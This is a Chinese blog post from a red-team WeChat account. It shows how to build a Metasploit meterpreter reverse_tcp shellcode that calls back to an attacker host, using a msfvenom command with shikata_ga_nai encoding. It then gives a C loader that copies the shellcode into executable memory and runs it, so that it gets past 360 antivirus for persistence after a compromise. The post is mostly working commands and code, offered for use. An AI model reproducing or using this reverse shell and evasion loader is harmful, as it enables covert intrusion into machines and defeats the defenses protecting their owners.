> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/c2yd0-EhK-Bc6raDZ27KXQ)

渗透攻击红队

一个专注于红队攻击的公众号

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDoZibS8XU01CtEtSbwM3VGr3qskOmA1VkccY0mwKTCq6u2ia1xYRwBn3A/640?wx_fmt=jpeg)

  

  

大家好，这里是 **渗透攻击红队** 的第 **43** 篇文章，本公众号会记录一些我学习红队攻击的复现笔记（由浅到深），不定时更新

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC4T65TNkYZsPg2BJ2VwibZicuBhV9DGqxlsxwG0n2ibhLuBsiamU7S0SqvAp6p33ucxPkuiaDiaKD6ibJGaQ/640?wx_fmt=gif)

免杀

在拿到一枚 shell 后，我们必须要做好权限维持，如果目标主机上有 AV 的话，我们一定要做好免杀处理，不能被发现！宁可不攻击也不要被发现，所以免杀是在内网渗透过程中最关键的一步！今天分享一个绕过某 60 的免杀技巧，总结就是：只要会代码，免杀随便绕！

**Metasploit 生成 C 过免杀 360**

**Metasploit**

Msf 相比大家都看过我直接写的笔记，大家也都会使用，这里也不一一细讲，直接上操作：

首先使用 MSF 的 shikata_ga_nai 构建 x86 一个 shellcode：

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.12 LPORT=9090 -e x86/shikata_ga_nai -i 8 -f c > shell.c
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LIAVhwqiaWuG5wVyAE60QiaG2hrTOnmfqHPm1BmXEJwsUTB6KGhupQW0ubMJiaNoRScQGia3u42DohBSw/640?wx_fmt=png)

然后使用 VC 编译（我用的是 VC 2019）：

```
#include <stdio.h>
#include <windows.h>

unsigned const char payload[] = "这里是生成的shellcode";

size_t size = 0;

int main(int argc, char** argv) {

    char* code;

    printf("Hello Hack saul!\n");

    code = (char*)VirtualAlloc(NULL, size, MEM_COMMIT,PAGE_EXECUTE_READWRITE);

    memcpy(code, payload, size); 

    ((void(*)())code)();

    return(0);
}
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LIAVhwqiaWuG5wVyAE60QiaG2nnUUQ6ruesd8qHUZVDpm0jyBNfRx4fA7cicnbjUXjaJ17Sr69lMAGCQ/640?wx_fmt=png)

字节可以改改，然后运行上线：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LIAVhwqiaWuG5wVyAE60QiaG21P8amiaCq71meD70YKW2joQSsiaFaoxukSCGIkicBAlkHeSmPQJmuZpug/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LIAVhwqiaWuG5wVyAE60QiaG2xVtUK12ibmToUFduFTsmLPaSk7y5DaxPlRXSDKIN6mI7sGZY40YUcvw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

渗透攻击红队

一个专注于渗透红队攻击的公众号

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDdjBqfzUWVgkVA7dFfxUAATDhZQicc1ibtgzSVq7sln6r9kEtTTicvZmcw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDY9HXLCT5WoDFzKP1Dw8FZyt3ecOVF0zSDogBTzgN2wicJlRDygN7bfQ/640?wx_fmt=png)

点分享

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDRwPQ2H3KRtgzicHGD2bGf1Dtqr86B5mspl4gARTicQUaVr6N0rY1GgKQ/640?wx_fmt=png)

点点赞

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDgRo5uRP3s5pLrlJym85cYvUZRJDlqbTXHYVGXEZqD67ia9jNmwbNgxg/640?wx_fmt=png)

点在看